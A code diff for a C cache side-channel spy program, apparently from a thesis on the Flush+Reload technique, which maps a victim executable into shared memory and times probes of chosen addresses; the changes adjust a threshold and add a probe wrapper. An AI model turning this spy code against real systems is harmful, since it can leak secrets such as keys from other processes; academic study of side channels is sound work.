@@ -5,13 +5,17 @@
 #include <sys/mman.h>
 #include <unistd.h>
 #include <stdint.h>
-#include <stdint.h>
 
-#define THRESHOLD 300
+#define THRESHOLD 180
 #define CYCLE_AMOUNT 200000
+
+#define MEASUREMENT_THRESHOLD
 
 // DaGe f+r implementation
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?
+
+
+
 
 // probe from paper
 int probe_treshold(char *adrs)
@@ -56,6 +60,15 @@ int probe_precise(char *adrs)
     return time; 
 }
 
+int probe(char *adrs)
+{
+#ifndef MEASUREMENT_THRESHOLD
+    return probe_precise(adrs);
+#else
+    return probe_treshold(adrs);
+#endif
+}
+
 // spy process probing certain memory addresses
 // https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c
 static __inline__ unsigned long long rdtsc(void)
@@ -73,7 +86,7 @@ void writer(char **target_adrs, int adrs_amount, unsigned int measurements[][CYC
     for(int i=0; i<adrs_amount; i++)
     {
         char *ptr = target_adrs[i];
-        sprintf(name_buf, "%s%p%s%lld%s", "measurements_",ptr,"_",rdtsc(),".txt");
+        sprintf(name_buf, "measurements_%p_%lld.txt", ptr, rdtsc());
         FILE *file = fopen(name_buf, "w");
         if (file == NULL)
         {
@@ -116,7 +129,7 @@ void spy(char **target_adrs, int adrs_amount)
         for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
         {
             char *ptr=target_adrs[cur_adr_i];
-            measurements[cur_adr_i][cur_slot]=probe_precise(ptr); 
+            measurements[cur_adr_i][cur_slot]=probe(ptr); 
             //printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
                                                                                                         // add timing to array for persistence 
         }
@@ -131,8 +144,8 @@ int main()
 {
     printf("starting\n");
     int map_len = 10; // max size bytes?
-    int file_descriptor = open("C:/cygwin64/home/thesis/flush-reload/textexec.exe", O_RDONLY); // hard coded path for the executable used by the victim 
-    void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0);
+    int file_descriptor = open("C:/cygwin64/home/thesis/flush-reload/textexec.exe", O_RDONLY); // hard coded path to open the executable used by the victim 
+    void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
     printf("binary mapped to %p\n", base);
 
     // TODO offsets (?)
